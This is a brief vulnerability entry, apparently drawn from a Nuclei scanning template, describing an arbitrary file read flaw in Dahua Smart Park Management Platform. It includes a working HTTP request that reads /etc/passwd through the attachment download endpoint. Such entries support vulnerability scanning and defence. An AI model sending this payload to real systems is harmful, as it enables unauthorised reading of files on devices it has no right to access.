# Vulnerability: Dahua Smart Park Management Platform - Arbitary File Read
**Classification:** CWE-22,CWE-73
**Source:** Nuclei Template (`dahua-wpms-lfi.yaml`)

## Description
Dahua Smart Park Management Platform is vulnerable to Local File Inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd
```

